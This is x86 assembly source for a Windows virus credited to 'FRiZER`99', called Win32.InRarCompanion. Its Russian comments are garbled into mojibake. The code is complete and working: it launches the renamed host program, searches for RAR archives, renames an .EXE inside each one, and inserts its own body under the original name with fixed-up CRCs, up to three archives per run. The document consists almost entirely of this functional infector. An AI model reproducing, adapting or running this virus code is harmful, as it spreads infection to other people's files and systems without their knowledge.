           ideal
           p586
           model flat

   INVALID_HANDLE_VALUE            = 0 - 1
   MB_OK                           = 00000000h
   OPEN_EXISTING                   = 00000003h
   FILE_SHARE_READ                 = 00000001h
   FILE_SHARE_WRITE                = 00000002h
   GENERIC_READ                    = 80000000h
   GENERIC_WRITE                   = 40000000h
   PAGE_READWRITE                  = 00000004h
   FILE_MAP_WRITE                  = 00000002h

   include "winprocs.inc"
   include "struc.inc"

   vsize   equ     3000h                   ; à §¬¥à ¢¨àãá  ???
   virext  equ     'DSM.'                  ;   çâ® ¬¥ï¥âáï .EXE
   runext  equ     'EXE.'                  ; à áè¨à¥¨¥ § à ¦ ¥¬ë© ä ©«®¢
   minsize equ     200000                  ; min à §¬¥à § à ¦ ¥¬®£®  àå¨¢ 
   maxinfc equ     3                       ; max ª®«-¢® § à ¦¥¨© §  à §

           dataseg
   CRC_Table       db      1024 dup (0)
   DTA             db      size FindData dup (0)
   StartupInfo     dd      40h             ;
                   dd      40h dup (0)     ; ¤«ï CreateProcess
   ProcInfo        dd      4 dup (0)       ;
   hFindFile       dd      0               ; ®¯¨á â¥«ì ¯®¨áª 
   hFile           dd      0               ; ®¯¨á â¥«ì ä ©« 
   hFileM          dd      0               ; ®¯¨á â¥«ì ¯à®¥ªæ¨¨
   hFileMV         dd      0
   FileSize        dd      0               ; à §¬¥à ä ©« 
   RarHdrOfs       dd      0               ; á¬¥é¥¨¥ ã¦®£® § £®«®¢ª  ¢  àå¨¢¥

   szCaption       db      'MuStDiE',0
   szText          db      'Win32.InRarCompanion by FRiZER`99',13,10
                   db      'mailto:v666x@mail.ru',0
   msk             db      '*.rar', 0      ; ¬ áª  ä ©«®¢
   InfCount        dw      0               ; áç¥âç¨ª § à ¦¥¨©

           codeseg
   Start:

   ; [ § ¯ãáâ¨¬ ®á¨â¥«ï ] -----------------------------------------------------

           call    GetCommandLineA         ; ¯®«ãç¥¨ï  ¤à¥á  ª®¬¬ ¤®© áâà®ª¨
           mov     edi, eax
           xchg    eax, ebx                ; § ¯®¬¨¬ ¢ ebx

           mov     ecx, 0FFh               ; ¤«¨  ª®¬ ¤®© áâà®ª¨
           cld
   scan_cmd:
           mov     eax, '.'                ;  ©¤¥¬ '.'
           repnz   scasb                   ; ¨é¥¬
           jne     Myxa_Not_Found          ; ¥  è«¨ - ¢ë¢¥¤¥¬ msgbox

           mov     eax, [dword edi-1]      ; eax - à áè¨à¥¨¥ ä ©« 
           and     eax, not 20202000h      ; ¯à¨¢¥¤¥¬ ª ¢¥àå¥¬ã à¥£¨áâàã
           cmp     eax, runext             ;  è«¨ .EXE ?
           jne     scan_cmd                ; ¥â - ¨é¥¬ ¤ «ìè¥
           mov     [dword edi-1], virext   ; ¬¥ï¥¬ à áè¨à¥¨¥

           push    offset ProcInfo
           push    offset StartupInfo
           push    0 0 0 0 0 0
           push    ebx                     ; ¨¬ï § ¯ãáª ¥¬®© ¯à®£à ¬¬ë
           push    0
           call    CreateProcessA          ; § ¯ãáª ¥¬ ®á¨â¥«ï
           test    eax, eax                ; ã¤ ç® § ¯ãáâ¨«¨?
           jnz     BeginVir                ; ¤  - ¯ãáâì à ¡®â ¥â ¢¨àãá
   Myxa_Not_Found:                         ; ¥â - ¢ë¢¥¤¥¬ msgbox
           push    MB_OK
           push    offset szCaption
           push    offset szText
           push    0
           call    MessageBoxA

   BeginVir:
           mov     [InfCount], 0           ; ®¡ã«ï¥¬ áç¥âç¨ª § à ¦¥¨©

   ; [ á®§¤ ¨¥ â ¡«¨æë ¤«ï ¯®¤áç¥â  CRC ] -------------------------------------

           lea     edi, [CRC_Table+1020]
           mov     ebp, 0FFh
           std
   thloop: mov     ecx, 8
           mov     eax, ebp
   tlloop: shr     eax, 1
           jnc     cf0
           xor     eax, 0EDB88320h
   cf0:    loop    tlloop
           stosd
           dec     bp
           jnz     thloop
           xchg    eax, ebp
           stosd

   ; [ ¯®¨áª ¯¥à¢®£® ä ©«  ¨§ *.rar ] ------------------------------------------

           push    offset DTA              ; áâàãªâãà  ¯®¨áª 
           push    offset msk              ; ofs ¬ áª¨ ä ©« 
           call    FindFirstFileA          ; ¨é¥¬ ¯¥à¢ë© ¯®¤å®¤ïé¨© ä ©«
           cmp     eax, INVALID_HANDLE_VALUE ; ®¡«®¬¨«¨?
           je      EndFind                 ; ¤  - § ¯ãáâ¨¬ ®á¨â¥«ï
           mov     [hFindFile], eax        ; ¥â - á®åà ¨¬ ®¯¨á â¥«ì

   CheckRar:                               ; ®¡à ¡®â ¥¬  ©¤¥ë© ä ©«
   ; [ ®âªàë¢ ¥¬ ä ©« ] --------------------------------------------------------

   ;        mov     ebp, esp                ; ebp - ofs § ¯®«¥®© áâàãªâãàë
           push    0                       ; ä ©«-¯à¨¬¥à  âà¨¡ãâ®¢
           push    0                       ;  ââà¨¡ãâë ä ©«  - ¥ ã¦ë
           push    OPEN_EXISTING           ; ®âªàë¢ ¥¬ áãé¥áâ¢ãîé¨© ä ©«
           push    0                       ; ãáâ ®¢ª  § é¨âë ¯® ã¬®«ç ¨î
           push    FILE_SHARE_READ or FILE_SHARE_WRITE ; â¨¯ á®¢¬¥áâ®£® ¤®áâã¯ 
           push    GENERIC_READ or GENERIC_WRITE ; á¯®á®¡ ¤®áâã¯  ª ä ©«ã
           lea     ebp, [(FindData DTA).FileName]
           push    ebp                     ; ofs ¨¬¥¨ ä ©« 
           call    CreateFileA             ; ®âªà®¥¬ ä ©«
           cmp     eax, INVALID_HANDLE_VALUE ; ®¡«®¬¨«¨ á ®âªàëâ¨¥¬?
           je      FindNext                ; ¤  - ¨é¥¬ á«¥¤ãîé¨©
           mov     [hFile], eax            ; ¥â - á®åà ¨¬ ®¯¨á â¥«ì
           xchg    eax, ebx                ; ¤«ï CreateFileMappingA

   ; [ ã§ ¥¬ à §¬¥à ®âªàëâ®£® ä ©«  ] -----------------------------------------

           push    offset FileSize         ; ªã¤  ¯®©¤¥â áâ àè ï ç áâì à §¬¥à 
           push    ebx                     ; ®¯¨á â¥«ì ä ©« 
           call    GetFileSize             ; ¯®«ãç¨¬ à §¬¥à
           mov     [FileSize], eax         ; á®åà ¨¥¬ à §¬¥à
           cmp     eax, minsize            ; à §¬¥à ä ©«  > minsize
           jbe     Close_hFile             ; ¥â -  ©¤¥¬ ¤àã£®©

   ; [ á®§¤ ¥¬ ¯à®¥ªæ¨î ä ©«  ] ------------------------------------------------

           push    0                       ; ¨¬ï ¯à®¥ªæ¨¨ (¥ âà¥¡ã¥âáï)
           push    0                       ; low-ç áâì  à §¬¥à 
           push    0                       ; high-ç áâì/  0 - â¥ªãé¨© à §¬¥à
           push    PAGE_READWRITE          ; ¬®¦® áç¨âë¢ âì ¨ § ¯¨áë¢ âì
           push    0                       ; ãáâ ®¢ª  § é¨âë ¯® ã¬®«ç ¨î
           push    ebx                     ; ®¯¨á â¥«ì ä ©« 
           call    CreateFileMappingA      ; á®§¤ ¤¨¬ ¯à®¥ªæ¨î ä ©« 
           test    eax, eax                ; ®¡«®¬¨«¨?
           jz      Close_hFile             ; ¤  - § ªà®¥¬ ä ©« ¨  ©¤¥¬ ¤àã£®©
           mov     [hFileM], eax
   ;        push    eax                     ;

   ; [ ¯à®¥æ¨àã¥¬ ä ©«®¢ë¥ ¤ ë¥    ¤à¥á®¥ ¯à®áâà áâ¢® ¯à®æ¥áá  ] ----------

           push    0                       ; ¯à®¥æ¨à®¢ âì ¢¥áì ä ©«
           push    0                       ; low-part -, á¬¥é¥¨ï á ª®â®à®£®
           push    0                       ; high-part/   ç¨ âì ¯à®¥æ¨à®¢ âì
           push    FILE_MAP_WRITE          ; ¬®¦® áç¨âë¢ âì ¨ § ¯¨áë¢ âì
           push    eax                     ; ®¯¨á â¥«ì ¯à®¥ªæ¨¨ ä ©« 
           call    MapViewOfFile           ; ¯à®¥æ¨àã¥¬
           test    eax, eax                ; ®¡«®¬¨«¨?
           jz      Close_hFileM            ; ¤  - § ªà®¥¬ ®¯¨á â¥«ì ¯à®¥ªæ¨¨...
           mov     [hFileMV], eax
           xchg    eax, ebx                ; ebx -  ç «® RAR  àå¨¢ 

   ; [ ®¡à ¡ âë¢ ¥¬ ä ©« ] -----------------------------------------------------

           cmp     [dword ebx], '!raR'     ; ä ©« ¤¥©áâ¢¨â¥«ì®  àå¨¢ RAR?
           jne     bad_rar                 ; ¥â - ¯®©¤¥¬ ¨áª âì á«¥¤ãîé¨©
           add     ebx, 7                  ; á«¥¤ãîé¨© ¡«®ª

           mov     ax, [(rar ebx).head_flags]
           test    al, 2Dh                 ; ¯®¤å®¤¨â «¨  àå¨¢ ¤«ï § à ¦¥¨ï
           jnz     bad_rar                 ; ¥â - ¯®¨é¥¬ ¤àã£®©

   ; [ ¯à®¢¥àª    ®ª®ç ¨¥ ä ©«  ] -------------------------------------------
   check_block:
           mov     eax, ebx
           add     eax, [FileSize]         ; eax - ofs ¯®á«¥ ¯à®¥ªæ¨¨ ä ©« 
           cmp     ebx, eax                ; ebx - ¥é¥ ¥£® ¥ ¤®áâ¨£« ?
           jae     bad_rar                 ; ¤  - ¯®©¤¥¬ ¨áª âì á«¥¤ãîé¨©

   ; [ ¯à®¢¥àª  ¡«®ª    § £®«®¢®ª ä ©«  ] -------------------------------------

           cmp     [(rar ebx).head_type], 74h ; § £®«®¢®ª ä ©« ?
           je      check_if_exe            ; ¤  - ¯à®¢¥à¨¬ EXE «¨ íâ®

   ; [ ¯¥à¥å®¤ ª á«¥¤ãîé¥¬ã ¡«®ªã ] --------------------------------------------
   next_block:
           movzx   eax, [(rar ebx).head_size] ; eax - à §¬¥à § £®«®¢ª 
           add     ebx, [(rar ebx).pack_size]
           add     ebx, eax                ; ebx -  ç «® á«¥¤ãîé¥£® ¡«®ª 
           jmp     check_block             ; ¯®¥å «¨ ®¯ïâì ¯à®¢¥àïâì

   ; [ ¯à®¢¥àª  à áè¨à¥¨ï  ©¤¥®£® ¢  àå¨¢¥ ä ©«    EXE ] ------------------
   check_if_exe:
           lea     ebp, [(rar ebx).file_name] ; ebp - ofs ¨¬¥¨ ä ©« 
           movzx   eax, [(rar ebx).name_size] ; eax - ¤«¨  ¨¬¥¨
           add     ebp, eax                ; ebp - ofs ¯®á«¥ ¨¬¥¨ ä ©« 
           mov     eax, [ebp-4]            ; eax - à áè¨à¥¨¥ ä ©« 
           and     eax, not 20202000h      ; ¯à¨¢¥¤¥¬ ª ¢¥àå¥¬ã à¥£¨áâàã
           cmp     eax, virext             ;  àå¨¢ ã¦¥ § à ¦¥?
           je      bad_rar                 ; ¤  -  ©¤¥¬ ¤àã£®©
           cmp     eax, runext             ; íâ® EXE-ä ©«?
           jne     next_block              ; ¥â - ¡ã¤¥¬ ¨áª âì...
           mov     [dword ebp-4], virext   ; ¯®¬¥ï¥¬ à áè¨à¥¨¥ ä ©« 

   ; [ ¯®¤áç¥â CRC ¨§¬¥¥®£® § £®«®¢ª  ] -------------------------------------

           lea     esi, [ebx+2]            ; ®âªã¤  áç¨â âì CRC
           movzx   ecx, [(rar ebx).head_size] ; à §¬¥à § £®«®¢ª 
           dec     ecx
           dec     ecx                     ; ecx - à §¬¥à § £®«®¢ª  ¡¥§ CRC
           call    clc_crc                 ; ¯®¤áç¨â ¥¬ CRC - ¢¥à¥âáï ¢ ecx
           mov     [ebx], cx               ; § ¯¨è¥¬ CRC ¢ § £®«®¢®ª
           movzx   eax, [(rar ebx).head_size] ; à §¬¥à § £®«®¢ª 
           add     eax, vsize              ; eax - à §¬¥à § £®«®¢ª  á ¢¨àãá®¬
           add     eax, [FileSize]         ; ¤«¨   àå¨¢  á ¤®¯¨á ë¬ ¢¨àãá®¬
           xchg    eax, ebx                ; ebx - ¤«¨   àå¨¢  "á ¢¨àãá®¬"
           sub     eax, [hFileMV]          ; eax - á¬¥é¥¨¥ § à ¦ ¥¬®£® ä ©« 
                                           ;       ®â  ç «   àå¨¢ 
           mov     [RarHdrOfs], eax        ; á®åà ¨¬ ¥£®

   ; [ ®âª«îç¨¬ ä ©« ¨ § ªà®¥¬ ¯à®¥ªæ¨î ] --------------------------------------

           push    [hFileMV]
           call    UnmapViewOfFile         ; ®âª«îç¨¬ ä ©« ®â ¯à®æ¥áá 
           push    [hFileM]
           call    CloseHandle             ; § ªà®¥¬ ¯à®¥ªæ¨î ä ©« 

   ; [ ®¯ïâì á®§¤ ¤¨¬ ¯à®¥ªæ¨î ¨ á¯à®¥æ¨àã¥¬ ä ©« ] ----------------------------

           push    0                       ; ¨¬ï ¯à®¥ªæ¨¨ (¥ âà¥¡ã¥âáï)
           push    ebx                     ; low-ç áâì  à §¬¥à 
           push    0                       ; high-ç áâì/  0 - â¥ªãé¨© à §¬¥à
           push    PAGE_READWRITE          ; ¬®¦® áç¨âë¢ âì ¨ § ¯¨áë¢ âì
           push    0                       ; ãáâ ®¢ª  § é¨âë ¯® ã¬®«ç ¨î
           push    [hFile]                 ; ®¯¨á â¥«ì ä ©« 
           call    CreateFileMappingA      ; á®§¤ ¤¨¬ ¯à®¥ªæ¨î ä ©« 
           test    eax, eax                ; ®¡«®¬¨«¨?
           jz      Close_hFile             ; ¤  - § ªà®¥¬ ä ©« ¨  ©¤¥¬ ¤àã£®©
           mov     [hFileM], eax

           push    0                       ; ¯à®¥æ¨à®¢ âì ¢¥áì ä ©«
           push    0                       ; low-part -, á¬¥é¥¨ï á ª®â®à®£®
           push    0                       ; high-part/   ç¨ âì ¯à®¥æ¨à®¢ âì
           push    FILE_MAP_WRITE          ; ¬®¦® áç¨âë¢ âì ¨ § ¯¨áë¢ âì
           push    eax                     ; ®¯¨á â¥«ì ¯à®¥ªæ¨¨ ä ©« 
           call    MapViewOfFile           ; ¯à®¥æ¨àã¥¬
           test    eax, eax                ; ®¡«®¬¨«¨?
           jz      Close_hFileM            ; ¤  - § ªà®¥¬ ®¯¨á â¥«ì ¯à®¥ªæ¨¨...
           mov     [hFileMV], eax
           xchg    eax, ebx

   ; [ ¯¥à¥¯¨è¥¬ § £®«®¢®ª ¨ â¥«® ¢¨àãá  ¢ ª®¥æ  àå¨¢  ] ----------------------

           mov     edi, [FileSize]
           add     edi, ebx                ; edi - ªã¤  ¯¨á âì § £®«®¢®ª
           add     ebx, [RarHdrOfs]        ; ebx - ofs § £®«®¢ª 
           movzx   ecx, [(rar ebx).head_size] ; ecx - à §¬¥à § £®«®¢ª 
           mov     esi, ebx                ; ®âªã¤  ¯¨á âì
           cld
           mov     ebx, edi                ; ebx - ofs ¯¥à¥¯¨á ®£® § £®«®¢ª 
           rep     movsb                   ; ¯¥à¥¯¨áë¢ ¥¬ § £®«®¢®ª
           push    edi                     ; § ¯®¬¨¬ ofs ¯®á«¥ § £®«®¢ª 

           push    0
           call    GetModuleHandleA

           mov     esi, eax                ; esi -  ç «® ä ©«  ¢¨àãá  ¢ ¯ ¬ïâ¨

   ; [ *…ã¨¢¥àá «ìë© á¯®á®¡ á®§¤ ¨ï ¤ ¬¯  - â®«ìª® ¤«ï íâ®£® ¢¨àãá  ] -------

   macro   movd    len
           mov     ecx, len/4
           rep     movsd
           add     esi, 1000h-len
           endm

           movd    600h
           movd    400h
           movd    800h
           movd    200h
           movd    200h

           mov     ecx, 1A00h/4
           rep     movsd

   ; [ ä®à¬¨à®¢ ¨¥ ¡«®ª  á ¢¨àãá®¬ ¢ rar'¥ ] ----------------------------------

           pop     esi                     ; esi -  ç «® dump'  ¢¨àãá  ¢ rar'¥
           mov     ecx, vsize              ; ecx - à §¬¥à ^^^^^^^^^^^^^^^^^^^^^
           mov     [(rar ebx).pack_size], vsize ; ¯®¬¥ï¥¬ à §¬¥à ¢ § £®«®¢ª¥
           mov     [(rar ebx).unp_size], vsize
           mov     [(rar ebx).method], 30h ; ¯®¬¥ï¥¬ ¬¥â®¤   store
           call    clc_crc                 ; ¯®¤áç¨â ¥¬ CRC ä ©« 
           mov     [(rar ebx).file_crc], ecx ; § ¯¨è¥¬ CRC ä ©«  ¢ § £®«®¢®ª

           lea     ebp, [(rar ebx).file_name] ; ebp - ofs ¨¬¥¨ ä ©« 
           movzx   eax, [(rar ebx).name_size] ; eax - ¤«¨  ¨¬¥¨
           add     ebp, eax                ; ebp - ofs ¯®á«¥ ¨¬¥¨ ä ©« 
           mov     [dword ebp-4], runext   ; ¯®¬¥ï¥¬ à áè¨à¥¨¥ ä ©« 

           lea     esi, [ebx+2]            ; ®âªã¤  áç¨â âì CRC
           movzx   ecx, [(rar ebx).head_size] ; à §¬¥à § £®«®¢ª 
           dec     ecx
           dec     ecx                     ; ecx - à §¬¥à § £®«®¢ª  ¡¥§ CRC
           call    clc_crc                 ; ¯®¤áç¨â ¥¬ CRC - ¢¥à¥âáï ¢ ecx
           mov     [ebx], cx               ; § ¯¨è¥¬ CRC ¢ § £®«®¢®ª

           inc     [InfCount]                ; ã¢¥«¨ç¨«¨ áç¥âç¨ª § à ¦¥¨©

   ; [ ®âª«îç¨¬ ä ©« ¤ ëå ®â  ¤à¥á®£® ¯à®áâà áâ¢  ¯à®æ¥áá  ] ---------------
   bad_rar:
           push    [hFileMV]
           call    UnmapViewOfFile

   ; [ § ªà®¥¬ ¯à®¥ªæ¨î ä ©«  ] ------------------------------------------------
   Close_hFileM:
           push    [hFileM]
           call    CloseHandle

   ; [ § ªà®¥¬ ä ©« ] ----------------------------------------------------------
   Close_hFile:
           push    [hFile]
           call    CloseHandle

   ; [  ©¤¥¬ á«¥¤ãîé¨© ä ©« ] -------------------------------------------------
   FindNext:
           cmp     [InfCount], maxinfc
           jae     EndFind
           push    offset DTA
           push    [hFindFile]
           call    FindNextFileA
           cmp     eax, 0
           jne     CheckRar

   ; [ § ªà®¥¬ ®¯¨á â¥«ì ¯®¨áª  ] ----------------------------------------------
   EndFind:
           push    [hFindFile]
           call    FindClose

   ; [ § ¢¥àè ¥¬ à ¡®âã ¢¨àãá  ] -----------------------------------------------
   Exit_Process:
           push    0
           call    ExitProcess             ; § ¢¥àè ¥¬áï

   ; [ ¯®¤áç¥â CRC à¥£¨® ,  ç¨ ï á esi, à §¬¥à®¬ ecx ] ----------------------
   clc_crc:
           cld
           push    ebx
           lea     edi, [CRC_Table]        ; edi -  ç «® CRC_Table
           mov     ebp, ecx                ; ebp - ¤«¨  à¥£¨® 
           mov     ecx, 0FFFFFFFFh
   c_loop: xor     eax, eax
           lodsb
           mov     ebx, eax
           xor     bl, cl
           shr     ecx, 8
           shr     eax, 8
           shl     eax, 8*3
           or      ecx, eax
           shl     ebx, 2
           xor     ecx, [edi+ebx]
           dec     ebp
           jnz     c_loop
           not     ecx
           pop     ebx
           ret

           end     Start
